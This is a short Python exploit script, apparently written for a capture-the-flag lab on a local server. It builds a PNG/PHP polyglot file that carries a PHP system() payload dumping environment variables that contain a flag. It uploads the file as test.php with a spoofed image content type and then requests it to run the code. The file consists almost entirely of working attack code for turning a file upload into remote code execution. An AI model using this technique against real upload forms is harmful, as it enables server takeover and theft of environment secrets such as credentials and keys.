import requests
import zlib

base_url = "http://127.0.0.1:32818"

# Minimal PNG polyglot with PHP
png_sig = b'\x89PNG\r\n\x1a\n'

# IHDR: 1x1 grayscale image
ihdr = b'\x00\x00\x00\x0d'  # Length: 13
ihdr += b'IHDR'
ihdr += b'\x00\x00\x00\x01\x00\x00\x00\x01\x08\x00\x00\x00\x00'
ihdr += b'\x3a\x7e\x9b\x55'  # CRC

# IDAT: minimal image data
idat = b'\x00\x00\x00\x0a'  # Length: 10
idat += b'IDAT'
idat += b'\x78\x9c\x62\x00\x00\x00\x02\x00\x01'
idat += b'\xe2\x21\xbc\x33'  # CRC

# PHP code
php = b'<?php system("env | grep FLAG"); ?>'

# IEND
iend = b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'

polyglot = png_sig + ihdr + idat + php + iend

print(f"[+] Polyglot size: {len(polyglot)} bytes")

# Test upload with .php extension
filename = "test.php"
print(f"\n[+] Uploading as: {filename}")

files = {'userfile': (filename, polyglot, 'image/png')}
data = {'submit': 'Upload File'}

try:
    r = requests.post(f"{base_url}/index.php", files=files, data=data, timeout=10)
    print(f"[+] Upload: {r.status_code}")
    print(r.text[:500])
    
    # Try accessing
    access = requests.get(f"{base_url}/upload/{filename}", timeout=10)
    print(f"\n[+] Access: {access.status_code}")
    print(access.text)
    
except Exception as e:
    print(f"[!] Error: {e}")

